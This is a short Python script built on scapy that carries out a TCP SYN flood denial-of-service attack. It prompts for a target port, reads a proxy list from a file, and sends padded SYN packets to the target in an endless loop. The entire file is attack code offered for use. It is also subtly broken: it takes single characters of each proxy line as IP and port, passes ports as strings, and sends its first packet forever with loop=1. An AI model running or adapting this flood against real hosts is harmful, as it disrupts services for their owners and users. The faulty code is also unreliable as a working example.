# Import necessary modules
import os
from scapy.all import *
from scapy.layers.inet import IP, TCP
from termcolor import colored
import time


def wait(secs):
    time.sleep(secs)


def synflood(target, proxy_list):
    print(colored('Which port do you want to target?', 'blue'))
    d_port = input()
    proxies = []
    print(colored('Checking Proxy File...', 'blue'))
    wait(1)
    if os.path.isfile(proxy_list):
        print(colored('Success: File exists', 'green'))
        wait(1)
        proxy_f = open(proxy_list, 'r')
        print(colored('Loading Proxies...', 'blue'))
        wait(3)
        lines = proxy_f.readlines()
        for line in lines:
            proxies.append(line)
        print(colored('Finished loading proxies, will continue with script!', 'green'))
        wait(1)
    else:
        print(colored("Please re-check your file. It doesn't exist.", 'red'))
        exit(0)
    while True:
        for combo in proxies:
            combo_parts = combo.split(":")
            proxy_ip = combo[0]
            proxy_port = combo[1]
            ip = IP(dst=target)
            tcp = TCP(sport=proxy_port, dport=d_port, flags="S")
            # Add Data to SynFlood
            data = Raw(('x'*1024).encode())
            p = ip / tcp / data
            send(p, loop=1, verbose=0)
        print(colored('DONE WITH FIRS SET.', 'blue'))
